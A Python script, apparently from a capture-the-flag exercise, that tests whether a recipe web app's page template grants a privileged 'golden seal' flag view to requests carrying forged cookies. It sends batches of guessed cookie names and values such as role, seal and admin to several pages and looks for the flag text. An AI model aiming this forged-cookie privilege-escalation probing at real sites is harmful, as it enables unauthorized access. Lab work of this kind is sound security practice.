#!/usr/bin/env python3
"""Has the RENDER path ever been tested against attacker-set cookies? No.

Every cookie experiment in both sessions aimed at the seal *handler* through the
inspector's browser, and read the result from the DB-derived Seal column. That can never
see the other, much more likely place a cookie matters: the EJS template that decides
whether to print `<div class="seal gold"><div class="flag">FLAG</div></div>`. A template
check like `<% if (req.cookies.golden_seal === '1') %>` or a locals merge would render the
golden block for whoever presents the cookie - and I can set arbitrary cookies on my own
requests directly, no worker, no 60-char title, no HttpOnly problem.

So: bundle candidate cookie names (value variants included) into single GETs against a
batch page we own, and look for the golden block, the `.flag` element, or `sun{` text.
Positive control built in: the same page is fetched with a clean jar first, and with the
known-inert `role=chief`.
"""
import re, sys, time
sys.path.insert(0, '.')
from cc import Client, new_baker

GOLD = re.compile(r'class="seal gold"|class="flag"|GOLDEN SEAL|Golden Seal')
FLAG = re.compile(r"sun\{[^{}\r\n]{1,200}\}")

u, c, _ = new_baker("rc")
code, out, dt = c.post("/api/recipe", {"title": "render oracle",
                                       "ingredients": [{"name": "flour", "value": "1"}]})
rid = out["id"]
c.post("/api/recipe/%s/submit" % rid, {})
time.sleep(14)
S = c.jar["session"]


def w(*a):
    sys.stdout.buffer.write((" ".join(str(x) for x in a) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def probe(label, pairs):
    ck = "session=%s; role=baker; " % S + "; ".join("%s=%s" % kv for kv in pairs)
    hits = []
    for path in ("/recipe/%s" % rid, "/dashboard", "/review/%s" % rid):
        code, page, dt = c.get(path, headers={"Cookie": ck})
        page = str(page)
        g = GOLD.search(page)
        f = FLAG.search(page)
        if g or f:
            hits.append((path, g.group(0) if g else None, f.group(0) if f else None))
            open("../files/render_gold_%s.html" % re.sub(r"\W", "_", label), "w",
                 encoding="utf-8").write(page)
    w("  %-30s %s" % (label, hits or "no golden render"))
    return bool(hits)


w("=== controls ===")
probe("clean jar", [])
probe("role=chief (known inert)", [("role", "chief")])

NAMES = ["seal", "seal_level", "sealLevel", "level", "review_level", "golden", "gold",
         "golden_seal", "golden-seal", "goldenseal", "goldenSeal", "is_golden", "isGolden",
         "gold_seal", "chief", "is_chief", "isChief", "the_chief", "head_chief", "chef",
         "role", "user_role", "role_level", "authority", "authorization", "staff",
         "inspector", "verified", "approved", "certified", "legendary", "grand_prize",
         "prize", "award", "ribbon", "rosette", "medal", "tier", "grade", "rank", "vip",
         "premium", "master", "baker_role", "cc_seal", "cc_role", "cookie_seal",
         "cookiecorp_seal", "cookiecorp_role", "x_seal", "x_role", "seal_type", "sealcolor",
         "color", "stamp", "verdict", "outcome", "decision", "status", "state", "reviewer",
         "approved_by", "sealed_by", "signed", "signature", "hmac", "token", "key"]
VALUES = ["chief", "1", "true", "gold", "golden", "yes", "inspector", "admin"]

w("=== bundle every name at once, per value (a golden render names nothing: it just wins) ===")
hit = False
for v in VALUES:
    if probe("all %d names = %r" % (len(NAMES), v), [(n, v) for n in NAMES]):
        hit = True
    time.sleep(0.2)

w("=== one name per request, value 'chief' (isolates rules that need an exact tray) ===")
for n in NAMES:
    if probe("%s=chief only" % n, [(n, "chief")]):
        hit = True
    if len(n) % 7 == 0:
        time.sleep(0.1)

w("=== self-referential and numeric variants ===")
COMBOS = [
    [("seal", "chief"), ("golden", "chief")],
    [("level", "chief"), ("role", "chief")],
    [("seal", "1"), ("level", "1"), ("golden", "1"), ("chief", "1")],
    [("seal", "reviewed")],
    [("seal", "standard")],
    [("golden_seal", "true")],
    [("session", S), ("seal", "chief")],
]
for pairs in COMBOS:
    probe("combo " + str(pairs)[:26], pairs)
w("golden render observed: %s" % hit)
